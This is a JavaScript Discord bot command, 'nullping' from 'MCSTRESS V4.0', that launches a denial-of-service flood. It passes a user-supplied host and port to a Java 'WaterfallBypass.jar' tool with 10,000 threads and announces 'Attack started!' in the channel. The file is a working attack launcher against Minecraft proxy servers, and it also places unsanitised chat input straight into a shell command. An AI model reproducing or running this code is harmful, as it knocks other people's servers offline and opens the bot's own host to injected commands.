const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar WaterfallBypass.jar host-${host} port-${port} threads-10000`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **MCSTRESS V4.0** 🔥')
	.setTimestamp()
	.setDescription("**► Method: NullPing 💥** \n \n ► Attack started! ✅ \n ► Đã bắt đầu! ✅ \n ► 200 giây!! 🕒 \n ☆ ☆")
 
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['nullping'],
  permLevel: 0
}

exports.help = {
  name: 'nullping',
  description: 'Özel',
  usage: 'nullping'
}